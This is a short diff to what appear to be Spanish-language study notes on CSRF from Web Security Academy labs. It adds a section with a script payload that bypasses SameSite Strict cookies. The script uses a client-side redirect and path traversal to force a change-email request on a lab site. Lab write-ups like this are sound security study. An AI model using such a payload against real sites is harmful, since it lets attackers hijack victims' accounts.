@@ -116,5 +116,15 @@ Reutilizar un token csrf de un usuario valido ya que puede no validar si en real
 
 #### Lab: SameSite Lax bypass via method override
 
+____________
+
+## Lab: SameSite Strict bypass via client-side redirect
+
+```
+<script>
+  window.location.href = "https://0a4900b604a870af8113fd31009a00eb.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=port%40hola.com%26submit=1";
+</script>
+```
+
 
 
